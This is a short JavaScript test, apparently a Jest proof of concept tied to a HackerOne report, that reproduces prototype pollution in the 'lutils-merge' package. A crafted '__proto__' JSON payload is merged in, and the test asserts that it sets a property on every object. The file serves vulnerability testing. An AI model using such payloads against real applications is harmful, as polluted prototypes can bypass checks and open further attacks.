//https://hackerone.com/reports/439107
test("prototype pollution in lutils-merge", () => {
  const merge = require("lutils-merge");
  const payload = '{"__proto__":{"polluted":"yes"}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(payload));
  expect({}.polluted).toBe("yes");
});
